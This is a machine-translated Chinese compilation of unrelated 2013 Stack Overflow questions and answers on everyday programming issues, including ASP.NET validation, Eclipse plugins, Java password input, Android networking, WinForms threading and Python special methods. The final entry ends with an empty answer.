> 时间：2013-03-01T14:12:37.977
> 
> 标签：jquery, asp.net, web-applications

我有一个 ASP.NET Web 应用程序，在那里我有`Form`一个`TextBoxes`附加`FieldValidator`到它们的地方。

在表单的末尾，我有一个典型的提交按钮，按下时会提交表单。

到目前为止一切正常。当某些字段为空时，也会触发验证器。

但是当用户提交表单时，页面重新加载新数据可能需要一些时间。所以我想做的是在提交按钮旁边添加一个“微调器”。所以用户知道它当前正在处理它的请求。

```
$(function () {
    $('form').submit(function () {
        $('.spinner').show();
    });
}); 
```

到目前为止，这也很好用。直到用户尝试提交带有无效字段的表单。然后微调器正在显示，但表单并没有真正提交。

有没有办法我可以回应？因此，当 ASP.NET 触发客户端验证消息时，我可以再次隐藏微调器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:28:00.617

您可以`Page_IsValid`在默认情况下应该可用的 Javascript 代码中使用该变量。所以在你的情况下，你可以简单地这样做：

```
$(function () {
    $('form').submit(function () {
        if (Page_IsValid) {
            // Do your thing...
        }
    });
}); 
```

# java - eclipse插件在更新到juno后不起作用（eclipse 4）

> ID：15159755
> 
> 赞同：6
> 
> 时间：2013-03-01T14:13:15.940
> 
> 标签：java, eclipse, eclipse-plugin

我创建了一个 Eclipse 插件，它将挂钩到保存操作以使用 goolge 闭包编译器创建一个缩小的 javascript 文件。请参阅下面的文件。这一直有效到 Eclipse 3.7.2。不幸的是，现在在 eclipse 4.2.1 中，这似乎有时会造成无限循环。工作“编译 .min.js”（ResourceChangedListener.java 中的第 64 行）似乎是原因。这会导致工作空间开始一遍又一遍地构建。我猜这是因为该作业创建或更改了再次触发工作区构建的文件，这再次触发了触发构建的作业等等。但我不知道如何防止这种情况。

// 激活器.java

```
package closure_compiler_save;

import org.eclipse.core.resources.ResourcesPlugin;
import org.eclipse.ui.plugin.AbstractUIPlugin;
import org.osgi.framework.BundleContext;

/**
 * The activator class controls the plug-in life cycle
 */
public class Activator extends AbstractUIPlugin  {

    // The plug-in ID
    public static final String PLUGIN_ID = "closure-compiler-save"; //$NON-NLS-1$

    // The shared instance
    private static Activator plugin;

    /**
     * The constructor
     */
    public Activator() {
    }

    @Override
      public void start(BundleContext context) throws Exception {
        super.start(context);
        Activator.plugin = this;

        ResourceChangedListener listener = new ResourceChangedListener();
          ResourcesPlugin.getWorkspace().addResourceChangeListener(listener);
    }

    @Override
      public void stop(BundleContext context) throws Exception {
        Activator.plugin = null;
        super.stop(context);
    }

    /**
     * Returns the shared instance
     *
     * @return the shared instance
     */
    public static Activator getDefault() {
        return plugin;
    }
} 
```

// ResourceChangedListener.java

```
package closure_compiler_save;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;

import org.eclipse.core.resources.IFile;
import org.eclipse.core.resources.IProject;
import org.eclipse.core.resources.IResource;
import org.eclipse.core.resources.IResourceChangeEvent;
import org.eclipse.core.resources.IResourceChangeListener;
import org.eclipse.core.resources.IResourceDelta;
import org.eclipse.core.runtime.CoreException;
import org.eclipse.core.runtime.IPath;
import org.eclipse.core.runtime.IProgressMonitor;
import org.eclipse.core.runtime.IStatus;
import org.eclipse.core.runtime.Status;
import org.eclipse.core.runtime.jobs.Job;

public class ResourceChangedListener implements IResourceChangeListener {

    public void resourceChanged(IResourceChangeEvent event) {
        if (event.getType() != IResourceChangeEvent.POST_CHANGE)
            return;

        IResourceDelta delta = event.getDelta();
        try {
            processDelta(delta);
        } catch (CoreException e) {
            e.printStackTrace();
        }
    }

    // find out which class files were just built
    private void processDelta(IResourceDelta delta) throws CoreException {

        IResourceDelta[] kids = delta.getAffectedChildren();
        for (IResourceDelta delta2 : kids) {
            if (delta2.getAffectedChildren().length == 0) {
                if (delta.getKind() != IResourceDelta.CHANGED)
                    return;

                IResource res = delta2.getResource();
                if (res.getType() == IResource.FILE && "js".equalsIgnoreCase(res.getFileExtension())) {
                    if (res.getName().contains("min"))
                        return;
                    compile(res);
                }
            }
            processDelta(delta2);
        }
    }

    private void compile(final IResource res) throws CoreException {

        final IPath fullPath = res.getFullPath();
        final IPath fullLocation = res.getLocation();
        final String fileName = fullPath.lastSegment().toString();
        final String outputFilename = fileName.substring(0, fileName.lastIndexOf(".")).concat(".min.js");
        final String outputPath = fullPath.removeFirstSegments(1).removeLastSegments(1).toString();

        final IProject project = res.getProject();
        final IFile newFile = project.getFile(outputPath.concat("/".concat(outputFilename)));
        Job compileJob = new Job("Compile .min.js") {
            public IStatus run(IProgressMonitor monitor) {
                byte[] bytes = null;
                try {
                    bytes = CallCompiler.compile(fullLocation.toString(), CallCompiler.SIMPLE_OPTIMIZATION).getBytes();

                    InputStream source = new ByteArrayInputStream(bytes);
                    if (!newFile.exists()) {
                        newFile.create(source, IResource.NONE, null);
                    } else {
                        newFile.setContents(source, IResource.NONE, null);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (CoreException e) {
                    e.printStackTrace();
                }
                return Status.OK_STATUS;
            }
        };
        compileJob.setRule(newFile.getProject()); // this will ensure that no two jobs are writing simultaneously on the same file
        compileJob.schedule();
    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-11T17:38:16.923

在我设置了一个空白的 Eclipse 经典环境之后，在那里启动了一个新的 Eclipse 插件项目并重新创建了所有文件，它再次部分工作。在这个开始调试会话的环境中，我可以保存 .js 文件并自动创建 .min.js 文件。到现在为止还挺好！但是当我将插件安装到我真正开发的 eclipse 环境中时，自动保存不起作用。

至少更进一步！

第 2 步：有些文件显然没有包含在构建中，比如清单。不知道他们为什么被取消选择。无论如何，似乎只是设置了一个空白的 eclipse 4 经典并通过 eclipse 插件向导解决了我原来的问题。我仍然很想知道真正的问题是什么...

# java - 如何在不使用 System.console() 的情况下从控制台读取密码？

> ID：15159762
> 
> 赞同：20
> 
> 时间：2013-03-01T14:13:28.917
> 
> 标签：java, security, console, passwords

我遇到了[这个 Eclipse 错误](https://bugs.eclipse.org/bugs/show_bug.cgi?id=122429)，`System.console()`它不适用于 Java 应用程序启动。我有一个小型 Java 应用程序，该应用程序还需要输入只能从 IDE 内启动的密码。有没有其他方法可以仅使用 JDK 类从控制台**安全**读取密码（即不在控制台上显示）？

**编辑：**
我知道`System.in`，但那是在控制台中显示输入的字符，因此不安全。

**EDIT2：**
我还想指出，可以在项目中在windows下创建批处理文件或在linux/unix下创建一个小bash脚本。通过使用系统默认编辑器在 Eclipse 中打开此文件，它将在`System.console()`可用的新控制台窗口中启动。这样您就可以从 Eclipse 中启动应用程序。但是必须先构建项目，以便二进制文件存在。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T14:40:00.690

也许代替控制台尝试使用带有`JPasswordField`. 这是来自[http://blogger.ziesemer.com/2007/03/java-password-dialog.html](http://blogger.ziesemer.com/2007/03/java-password-dialog.html)的示例。

```
final JPasswordField jpf = new JPasswordField();
JOptionPane jop = new JOptionPane(jpf, JOptionPane.QUESTION_MESSAGE,
        JOptionPane.OK_CANCEL_OPTION);
JDialog dialog = jop.createDialog("Password:");
dialog.addComponentListener(new ComponentAdapter() {
    @Override
    public void componentShown(ComponentEvent e) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                jpf.requestFocusInWindow();
            }
        });
    }
});
dialog.setVisible(true);
int result = (Integer) jop.getValue();
dialog.dispose();
char[] password = null;
if (result == JOptionPane.OK_OPTION) {
    password = jpf.getPassword();
}
if (password != null)
    System.out.println("your password: " + new String(password)); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T15:06:46.847

如果`System.console()`返回`null`，这意味着就 Java 而言没有可用的控制台。

*   您不能使用`System.in`，因为它可能没有连接到控制台。

*   即使可以，也没有可移植的方法来关闭 Java 中的回显。

*   您可能可以使用 Swing（或其他）弹出一个窗口来询问密码，但如果系统是无头的，那将无法工作。

* * *

如果您准备做非便携式的事情，那么（在 Linux / UNIX 上）您可以尝试打开“/dev/console”或“/dev/tty”。然后您可以使用 termios 将 tty 驱动程序置于 noecho 模式。但是您至少需要在本机代码中执行其中的一些操作。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-09-21T17:00:59.010

我遇到了同样的问题。（亲爱的 Eclipse 社区：修复那个 bug 有这么难吗？）和其他人一样，我需要 IDE 来进行开发/调试和独立运行。

所以我写了这个方法：

```
private static String readPwd() throws IOException {
    Console c=System.console();
    if (c==null) { //IN ECLIPSE IDE
        System.out.print("Password: ");
        InputStream in=System.in;
        int max=50;
        byte[] b=new byte[max];

        int l= in.read(b);
        l--;//last character is \n
        if (l>0) {
            byte[] e=new byte[l];
            System.arraycopy(b,0, e, 0, l);
            return new String(e);
        } else {
            return null;
        }
    } else { //Outside Eclipse IDE
        return new String(c.readPassword("Password: "));
    }
} 
```

这种变通方法的缺点是在 Eclipse 中，您将在程序运行时看到密码。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-12-05T19:28:31.840

与@Pshemo 给出的答案类似，可以回退到 Swing：

```
final String passwd;
final String message = "Enter password";
if( System.console() == null ) { 
  final JPasswordField pf = new JPasswordField(); 
  passwd = JOptionPane.showConfirmDialog( null, pf, message, 
    JOptionPane.OK_CANCEL_OPTION, JOptionPane.QUESTION_MESSAGE ) == JOptionPane.OK_OPTION 
      ? new String( pf.getPassword() ) : ""; 
} else 
  passwd = new String( System.console().readPassword( "%s> ", message ) ); 
```

# c# - 收到此错误 - “处理程序“iisnode”在其模块列表中有一个错误模块“iisnode””

> ID：15159765
> 
> 赞同：0
> 
> 时间：2013-03-01T14:13:35.783
> 
> 标签：c#, iis, azure, socket.io, iisnode

我正在尝试在我的天蓝色项目中实现 socket.io。我按照这里提到的说明[https://github.com/tjanczuk/iisnode](https://github.com/tjanczuk/iisnode)在我的 Windows 8 上安装了 iisnode。一切都安装得很好，这里 iisnode 附带的示例 node.js 应用程序也`http://localhost/node/helloworld/hello.js`运行得很好。

但是当我在我的 VS 2012 上的 azure 项目中运行我的 App.js 时，我收到错误“处理程序“iisnode”在其模块列表中有一个错误的模块“iisnode””。这非常令人沮丧。

网页配置

```
 <add name="iisnode" path="App.js" verb="*" modules="iisnode" /> 
```

有谁可能是什么问题？任何想法都将不胜感激……我一整天都对此感到震惊。

![错误](../Images/f067c873f4bbfeab15f8bf45c2c8492b.png)

编辑：

我的应用程序在 iis express 上运行，所以我从 Web Platform Installer 为 IIS Express 安装了 IISNode。但我认为 IIS Express 的 IISNode 仅适用于 x86，因为它正在我的程序文件（x86）中寻找 node.js，所以即使我的系统是 64 位，我也必须安装 x86 版本的 node.js。在 socket.io 工作之后，但是当我在包含 socket.io 实现的浏览器中打开我的 App.js 时，我收到以下错误。我应该担心这个错误吗？因为 socket.io 实现工作正常 ![在此处输入图像描述](../Images/120e0359b26bf86d392648f878b0e640.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:42:20.687

这可能表明您运行应用程序的 IIS 工作进程与已安装的 iisnode 版本的位数不匹配。

你有什么版本的iisnode，它是如何安装在机器上的？node.js 应用程序是如何托管的（IIS Express 或完整的 IIS）？

# android - 无法在 Android 中使用 HttpClient 和 HttpGet

> ID：15159771
> 
> 赞同：-3
> 
> 时间：2013-03-01T14:13:52.940
> 
> 标签：android

我想使用 yahoo api 找出天气信息。但是，执行以下语句时出现错误。我可以有一些提示来解决它吗？谢谢。

```
HttpClient httpClient = new DefaultHttpClient();

HttpGet httpGet = new HttpGet(queryString);

HttpEntity httpEntity = httpClient.execute(httpGet).getEntity();  // <--- error here 
```

我已将 Internet 权限添加到 mainfest。

```
03-01 22:06:27.310: E/AndroidRuntime(27723): FATAL EXCEPTION: main
03-01 22:06:27.310: E/AndroidRuntime(27723): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.exercise.AndroidYahooWeatherDOM/com.exercise.AndroidYahooWeatherDOM.AndroidYahooWeatherDOMActivity}: android.os.NetworkOnMainThreadException
03-01 22:06:27.310: E/AndroidRuntime(27723):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1967)
03-01 22:06:27.310: E/AndroidRuntime(27723):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1992)
03-01 22:06:27.310: E/AndroidRuntime(27723):    at android.app.ActivityThread.access$600(ActivityThread.java:127)
03-01 22:06:27.310: E/AndroidRuntime(27723):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1158)
03-01 22:06:27.310: E/AndroidRuntime(27723):    at android.os.Handler.dispatchMessage(Handler.java:99)
03-01 22:06:27.310: E/AndroidRuntime(27723):    at android.os.Looper.loop(Looper.java:137) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:18:08.590

You need to use a separate thread or better an [`AsyncTask`](http://developer.android.com/reference/android/os/AsyncTask.html), to do an Http connection

For example:

```
private class DownloadFilesTask extends AsyncTask<URL, Integer, Long> {
 protected Long doInBackground(URL... urls) {
     int count = urls.length;
     long totalSize = 0;
     for (int i = 0; i < count; i++) {
         totalSize += Downloader.downloadFile(urls[i]);
         publishProgress((int) ((i / (float) count) * 100));
         // Escape early if cancel() is called
         if (isCancelled()) break;
     }
     return totalSize;
 }

 protected void onProgressUpdate(Integer... progress) {
     setProgressPercent(progress[0]);
 }

 protected void onPostExecute(Long result) {
     showDialog("Downloaded " + result + " bytes");
 }
} 
```

# ios - 刷新 UIToolbar

> ID：15159774
> 
> 赞同：2
> 
> 时间：2013-03-01T14:13:59.197
> 
> 标签：ios, objective-c, uitoolbar

我创建了`subclass`一个`UIToolbar`. 并`toolbar items`从中设置`class`。在，`ViewController`我拿了一个`toolbar`并分配给它一个类`subclass`。`UIToolbar`它`toolbar items`在上面显示。

问题是，当我更新它时，`toolbar items`它没有显示在`viewController`. 当我去另一个`view`地方时，`view`它的显示更新了`toolbar items`。

我需要立即刷新`toolbar items`。`viewController`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:24:23.630

在包含你的 viewController 中`UIToolbar`，调用“[self.view setNeedsLayout]”（甚至只是`[self.toolbar setNeedsLayout]`）来强制重新绘制图形上下文。

但是，在不同的注意事项上：您不需要子类 UIToolbar 来设置工具栏项。通过调用创建一个`UIToolbar`并设置其数组`items``[self.myToolbar setItems:@[item1, item2, ...]]`

# ruby-on-rails - Rails 3：redirect_to 指定主机不起作用

> ID：15159782
> 
> 赞同：0
> 
> 时间：2013-03-01T14:14:22.643
> 
> 标签：ruby-on-rails, redirect, subdomain

我想将用户重定向到命名路由，但重定向到不同的子域。我认为将主机指定为最后一个参数`redirect_to`会这样做，但它不起作用。这是我正在使用的代码：

```
redirect_to(log_in_url(return_to: request.fullpath), host: "https://acme.lvh.me:3000/") 
```

由于某种原因，这不起作用。这是一个场景和正在发生的事情：

*   我上线了`https://oauth.lvh.me:3000/oauth/authorize`
*   我使用`redirect_to`上面指定的方法。
*   它把我重定向到`https://oauth.lvh.me:3000/log_in`
*   相反，它应该将我重定向到`https://acme.lvh.me:3000/log_in`

请问我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:28:29.640

我自己发现了问题。首先`host: "https://acme.lvh.me:3000/`应该`host: acme.lvh.me`改为。其次，选项应该传递给`log_in_url`方法而不是`return_to`方法！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:30:31.867

我觉得应该很简单。尝试这样的事情：

```
redirect_to request.url.sub('oauth', 'acme') 
```

# c# - 将控制台输出重定向到文本框时发生跨线程操作

> ID：15159787
> 
> 赞同：2
> 
> 时间：2013-03-01T14:14:27.477
> 
> 标签：c#, multithreading, winforms

一般来说，我是 C# 和 GUI 开发的新手。如果这是一个老问题，请直接引导我到那个来源，我会记下这个问题。

**我的情况：**所以我正在编写一个 GUI，它将一个函数的控制台输出重定向到我的 Windows 应用程序表单中的文本框。控制台输出仅向用户显示设备序列号、当前软件版本等信息。

**我的问题：**这个表格很好用，除了更新软件的过程需要几分钟，这会冻结我的表格，直到它完成。现在，我知道实施后台工作人员将缓解这个问题。但是，当我实现后台工作人员时，我收到以下错误。

> 跨线程操作无效：控件“TextBox”从创建它的线程以外的线程访问。

我的代码摘要如下：

```
public class Form1 : Form
{
    this.backgroundWorker1.DoWork += new
    System.ComponentModel.DoWorkEventHandler(this.backgroundWorker1_DoWork);

    private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
         BackgroundWorker bw = sender as BackgroundWorker;     
         BigProcess(bw);
    }

    private void BigProcess(BackgroundWorker bw)
    {
        // lengthy operation that includes lots of
        Console.WriteLine("feedback stuff for the user");
    }

    private void button1_Click(object sender, EventArgs e)
    {
        this.backgroundWorker1.RunWorkerAsync();
    }
} 
```

在这个项目中，我还有一个`TextBoxStreamWriter`派生的类，`StringWriter`它为我处理控制台输出的重定向。在`TextBoxStreamWriter`我重写`WriteLine`方法和`Write`方法。

这是我正在做的一个例子：

```
public override void WriteLine(string value)
{
      base.WriteLine(DateTime.Now.ToString(value));
      textBoxOutput.AppendText(value.ToString() + Environment.NewLine);
      writer.Write(value);
} 
```

调用此方法时会引发 InvalidOperationException。

我怎样才能使这个线程安全？任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:21:10.030

您只需要将文本框的更新返回到 UI 线程 - 例如：

```
if (textBoxOutput.InvokeRequired)
{
  Invoke((MethodInvoker)(() => textBoxOutput.AppendText(value.ToString() + Environment.NewLine);
}
else
{
   textBoxOutput.AppendText(value.ToString() + Environment.NewLine)
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T15:05:24.670

`BackgroundWorker`公开一个事件：`RunWorkerCompleted`用于使用长时间运行操作的结果更新 UI 。该事件将在 UI 线程中触发。

因此，您需要做的就是处理该事件，而不是手动编组到 UI 线程。

```
backgroundWorker1.RunWorkerCompleted += (s, args)=> 
    textBoxOutput.AppendText(args.Result.ToString() + Environment.NewLine); 
```

然后，您可以将结果设置为`DoWork`您想要打印的任何内容。

如果您想在整个后台处理过程中更新 UI，那么您实际上拥有“进度更新”。BGW 内置了对在整个后台工作过程中更新 UI 的支持。有关示例，请参阅 BGW 的 MSDN 页面。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:21:10.527

试试这个：

```
public override void WriteLine(string value)
{
    if (InvokeRequired)
    {
        Invoke(() => WriteLine(value));
        return;
    }

    base.WriteLine(DateTime.Now.ToString(value));
    textBoxOutput.AppendText(value.ToString() + Environment.NewLine);
    writer.Write(value);
} 
```

这将检查 WriteLine 是否是从与拥有表单的线程不同的线程调用的。如果是，它将要求拥有表单的线程再次调用该方法，仅在正确的线程上。

# magento - 如何获得所有 Magento 产品品牌

> ID：15159788
> 
> 赞同：0
> 
> 时间：2013-03-01T14:14:27.697
> 
> 标签：magento

如何在不经过完整的产品集合的情况下获得包含所有产品品牌的数组或对象。

这个想法是创建一个动态的品牌页面，其中包含指向每个品牌的链接。

所以后面的代码会是这样的：

```
<ul>
<?foreach ($brands as $brand):?>
<li>
<a href="<?=$helper->getBrandUrl($brand)?>"><?=$helper->getBrandName($brand)?></a>
</li>
<?endforeach;?>
</ul> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:58:36.067

在我的 magento 品牌中，属性号为 66，我可以通过此请求拥有所有品牌：

```
SELECT DISTINCT value
FROM eav_attribute_option o, eav_attribute_option_value v
WHERE attribute_id = '66'
AND o.option_id = v.option_id 
```

但是，如果您需要以 OOP 方式使用它：

```
$attribute = Mage::getModel('catalog/resource_eav_attribute')->load(66);
$attributeOptions = $attribute->getSource()->getAllOptions();  ?>
            <?php foreach ($attributeOptions as $option) {
            if ($option['value']) echo $option['value']." > ".$option['label']."<br/>";
            } ?> 
```

# javascript - 替代 Jquery 鼠标事件

> ID：15159796
> 
> 赞同：0
> 
> 时间：2013-03-01T14:14:46.667
> 
> 标签：javascript, jquery

好吧，如果我在#nav div 之外单击，下面的代码可以正常工作。我在问是否可以将鼠标从#nav div移开以使其消失。我不想“点击”来隐藏 div。

```
$(document).mouseup(function (e)
{
    var container = $("#nav");

    if (container.has(e.target).length === 0)
    {
        container.hide();
    }
}); 
```

任何帮助将不胜感激 ：）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:17:14.527

分配一个隐藏`mouseleave`事件元素的函数。

```
$("#nav").mouseleave(function(){
    $(this).hide(); 
}); 
```

小提琴：http: [//jsfiddle.net/howderek/SRMT8/](http://jsfiddle.net/howderek/SRMT8/)

# testing - 是否可以使用 eCATT 检查特定值？

> ID：15159798
> 
> 赞同：0
> 
> 时间：2013-03-01T14:14:47.610
> 
> 标签：testing, automated-tests, sap

我正在研究[eCATT](http://de.wikipedia.org/wiki/ECATT)并找到了很多示例，但我没有找到我的问题的示例。

使用 eCATT，我可以使用不同的测试数据检查交易。但是如果可以检查特定数据，我没有找到示例。

可以*测试更新（数据库、应用程序、GUI）*（参见[abap-tutorials.com](http://www.abap-tutorials.com/2010/11/10/belling-the-ecatt-extended-computer-aided-test-tool/)），但我也可以检查某些字段的结果吗？

示例：我用不同的客户和材料检查 VA01。我可以检查一下，如果 VA01 工作正常并创建了订单。但是是否可以检查订单的净值（VBAK-NETWR）是否与我的预期价格相同？

* * *

更新：我[在 sappress 找到了另一本书](http://www.sap-press.de/katalog/buecher/htmlleseproben/gp/htmlprobID-55)。在*命令*部分的末尾是以下文本：

> 但是，在个别情况下，可能需要直接搜索数据库表以查找特定值的存在和特征。

这听起来像是对我的问题的肯定回答，但我想得到一个确认，也许是一个例子。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T10:18:17.690

我找到了我正在寻找[的场景的描述](http://help.sap.com/saphelp_nw73ehp1/helpdata/en/49/70aa6b81463e90e10000000a42189c/content.htm)

> 根据需要参数化 CheckAction 和 ExpectedValue 字段。您还可以选择参数化 Value 字段以执行 GET

在“ [SAP Lösungen testen](http://www.sap-press.de/download/dateien/1107/sappress_sap_loesungen_testen.pdf) ”（对不起，德语）一书中，我正在寻找的功能描述。请参见第 207 页（在 pdf-extract 第 42 页中）。( *GETGUI/CHEGUI* )

# c# - 从 Active Directory 获取配置文件路径和主文件夹

> ID：15159806
> 
> 赞同：1
> 
> 时间：2013-03-01T14:15:00.210
> 
> 标签：c#, active-directory

我正在使用 C#，我可以从 Active Directory 中读取很多值，但是我不知道如何读取配置文件路径或远程桌面服务主文件夹，它们都可以在远程桌面服务中找到查看 Active Directory 中的用户时的“个人资料”选项卡。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-08-17T08:31:40.367

这些值存储在 UserParameters 属性中，要获取它们，您可以在此处使用 InvokeGet，例如获取远程服务配置文件路径：

```
// Get Directory Entry for the object
DirectoryEntry de = New DirectoryEntry(ldapPath, logonName, password);
object prPAth = de.InvokeGet("TerminalServicesProfilePath"); // Remote Desktop Services profile path. If value is empty you'll get an exception here
object homeFolder = de.InvokeGet("TerminalServicesHomeDirectory"); // Remote Desktop Services home folder 
```

# python - 从另一个对象分配 __len__() 方法

> ID：15159807
> 
> 赞同：2
> 
> 时间：2013-03-01T14:15:02.347
> 
> 标签：python, python-2.7, python-3.x

我将实现一些容器对象。

```
class A:
    def __init__(self, L):
        self.L = list(L)
    def __len__(self):
        return len(self.L)

class B:
    def __init__(self, L):
        self.L = list(L)
        self.__len__ = self.L.__len__ 
```

在第一种情况下，同时`len()`工作`.__len__()`

```
>>> a = A(range(10))
>>> a.__len__()
10
>>> len(a)
10 
```

但在第二种情况下，我得到错误`len()`。

```
>>> b = B(range(10))
>>> b.__len__()
10
>>> len(b)
Traceback (most recent call last):
  File "<pyshell#93>", line 1, in <module>
    len(b)
TypeError: object of type 'B' has no len() 
```

1.  为什么`len()`在第二种情况下不起作用，而`.__len__()`被定义并正常工作？
2.  通常可以将一些方法从一个对象分配给另一个对象吗？就像我对`self.L.__len__()`.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:18:53.160

你不能这样做，特殊的钩子方法`__len__`总是*在*类型上查找，而不是在实例上。

换句话说，`len(ob)`调用`type(ob).__len__(ob)`，*而不是* `ob.__len__()`。

请参阅[特殊方法查找文档](http://docs.python.org/3/reference/datamodel.html#special-lookup)；我解释了为什么这是[在以前的答案](https://stackoverflow.com/questions/14102407/implementing-getitem-in-new-style-classes/14102566#14102566)中。

对于*不是*特殊钩子的方法（以双下划线开头和结尾），您可以自由地将方法分配给您的实例，没有*技术*原因阻止您这样做。

如果您的目标是提供[外观对象](http://en.wikipedia.org/wiki/Facade_pattern)，那么一定要复制方法。我认为这样做没有明显的缺点。直接在您的实例上调用该方法，而不必通过包装器方法进行路由，性能会稍好一些（您为包装器方法保存堆栈推送和弹出）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T14:19:21.717

[精美的 Python 文档](http://docs.python.org/2/reference/datamodel.html#new-style-special-lookup)告诉我们，

> 对于新式类，特殊方法的隐式调用只有在对象类型上定义时才能保证正常工作，而不是在对象的实例字典中。

# java - 如何在 Java Swing 中使用图像作为按钮

> ID：15159810
> 
> 赞同：1
> 
> 时间：2013-03-01T14:15:06.423
> 
> 标签：java, swing, jbutton, jlabel, imagebutton

我正在使用 netbeans 创建一个项目应用程序，我正在尝试获取一个自定义图像文件作为一个按钮，我听说某处将它设置为一个标签，但我对此很陌生，所以我需要深入了解回答如何做到这一点。该网站不允许我发布按钮的图像，因为我只是新手，但按钮是三角形的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:24:37.750

使用[API 中实现的方法并从`JButton`](http://docs.oracle.com/javase/7/docs/api/javax/swing/JButton.html).

例如

![在此处输入图像描述](../Images/289bf4e58ea6388eef3549fcfaec1297.png) ![在此处输入图像描述](../Images/762f2f078a3e8562200ec254ce2c4813.png)

从代码

```
import java.awt.Insets;
import javax.swing.Icon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;

public class MyToggleButton extends JFrame {

    private static final long serialVersionUID = 1L;
    private Icon errorIcon = UIManager.getIcon("OptionPane.errorIcon");
    private Icon infoIcon = UIManager.getIcon("OptionPane.informationIcon");
    private Icon warnIcon = UIManager.getIcon("OptionPane.warningIcon");

    public MyToggleButton() {
        final JButton toggleButton = new JButton();
        toggleButton.setBorderPainted(false);
        toggleButton.setBorder(null);
        toggleButton.setFocusable(false);
        toggleButton.setMargin(new Insets(0, 0, 0, 0));
        toggleButton.setContentAreaFilled(false);
        toggleButton.setIcon((errorIcon));
        toggleButton.setSelectedIcon(infoIcon);
        toggleButton.setRolloverIcon((infoIcon));
        toggleButton.setPressedIcon(warnIcon);
        toggleButton.setDisabledIcon(warnIcon);
        add(toggleButton);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        pack();
        setVisible(true);
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                MyToggleButton t = new MyToggleButton();
            }
        });
    }
} 
```

# php - 使 Zend 2 只搜索同一模块中的模板

> ID：15159813
> 
> 赞同：0
> 
> 时间：2013-03-01T14:15:11.317
> 
> 标签：php, zend-framework2, zend-framework-mvc, zend-framework-modules

我有（简化）两个模块，`Application`和`Admin`. 我已经在这个`Admin`模块上工作了一段时间，并从`Application`. 这两个模块都有一个名为`UsersController`.

现在，当我开始制作`Application`并创建一些路线和动作时，我的`Admin`模块坏了。尝试在任何地方打开任何管理页面时遇到的错误类似于

```
Unable to render template "application/users/index" 
```

根据[文档](http://framework.zend.com/manual/2.1/en/modules/zend.view.quick-start.html#controllers-and-view-models)，模板路径的第一部分取自调用控制器的命名空间。但是自从我创建了目录`module/Application/view/application/users/`后，它就尝试`Admin\Controller\UsersController`从那里获取所有模板，而不考虑名称空间。

如何让 Zend 再次使用命名空间，而不必每次都在操作中强制模板文件？

（使用 Zend 2.1.3）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T11:31:45.550

这里的问题是我在多个模块中为控制器名称使用了相同的别名。所以我把他们的名字改成了这样：

```
'controllers' => array(
    'invokables' => array(
        'AdminIndex' => 'Admin\Controller\IndexController',
    ),
), 
```

另一个模块配置使用相同的名称，因此只是覆盖了我的管理模块中的名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-02T17:18:57.070

```
namespace Admin;

class Module
{
    public function init($moduleManager)
    {
        $sharedEvents = $moduleManager->getEventManager()->getSharedManager();
        $sharedEvents->attach(__NAMESPACE__, 'dispatch', function($e) {
            $actionName = $e->getRouteMatch()->getParam('action');
                $controller = $e->getTarget();
                $controller->layout(__DIR__ . "/Application/view/application/user/$actionName");
        }, 100);
    }
} 
```

# java - 没有使用动作链接在目标动作中设置实例成员值？

> ID：15159827
> 
> 赞同：1
> 
> 时间：2013-03-01T14:15:37.340
> 
> 标签：java, struts2

这是我正在使用动作链接的 struts 2 流程

JSP--->Action1--->Action2--->ResultJsp

使用动作链接，我的理解是请求从动作1转发到动作2。因此，如果我将一些参数从动作1传递到动作2，它应该设置在新动作实例变量（/为新动作创建的值堆栈）中。但它没有发生

下面是我在action1中的代码

```
@Result(name = "displayEmployee",type = "chain",
        params = {
            "namespace", "/employee",
            "actionName", "Employee-lookup!search",
            "empMode", "true"

        })

@Action("display-employee!displayEmployee")
  public String displayEmployee() {
    return "displayEmployee";
  } 
```

现在在 Action 2 即 display-employee 中，我有名为 empMode 的布尔属性。但是我得到的值是假的，虽然我应该得到它是真的，因为我在结果注释中将它作为属性传递。正如我对动作链接的理解，所有请求参数都从动作1转发到动作2。基本上，为 action2 创建了新的值堆栈，其中包含 action1 中存在的变量。那么为什么在动作 2 中没有为 empMode 属性设置值 true 呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T18:57:16.703

